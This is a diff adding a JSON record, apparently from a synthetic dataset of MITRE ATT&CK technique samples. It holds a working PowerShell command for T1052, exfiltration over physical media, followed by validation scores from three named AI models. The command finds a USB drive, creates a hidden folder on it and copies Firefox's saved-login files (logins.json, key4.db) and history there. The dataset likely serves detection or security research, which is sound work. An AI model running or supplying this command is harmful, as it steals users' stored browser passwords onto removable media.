@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $dst=Join-Path $usb '.pkg'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; $src=\"$env:USERPROFILE\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\"; if(Test-Path $src){ Get-ChildItem -Path $src -Recurse -Include logins.json, key4.db, places.sqlite -ErrorAction SilentlyContinue | Copy-Item -Destination $dst -Force }",
+  "explanation": "Copies select Firefox profile databases to a hidden folder on the removable drive using Copy-Item, staying entirely local.",
+  "rationale_steps": [
+    "Resolve USB drive via WMI",
+    "Create a hidden destination directory",
+    "Locate targeted browser profile artifacts",
+    "Copy results to USB using Copy-Item"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-afb253a5",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, proper separators, and valid cmdlets/parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a removable drive, creates a hidden directory, and copies targeted Firefox profile files there, aligning with exfiltration over physical media.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:54:00.792219Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, balanced quotes/parentheses/braces, appropriate command separators, valid cmdlet parameters, and correct pipeline usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by identifying a removable drive, creating a hidden directory, and exfiltrating sensitive Firefox credential files (logins.json, key4.db, places.sqlite) to that physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:54:03.934627Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid PowerShell syntax for all cmdlets, and has balanced parentheses and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies a removable drive, creates a hidden staging directory, and copies critical Firefox profile data, perfectly aligning with the T1052 technique for exfiltration over physical medium and the provided explanation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:54:12.385404Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
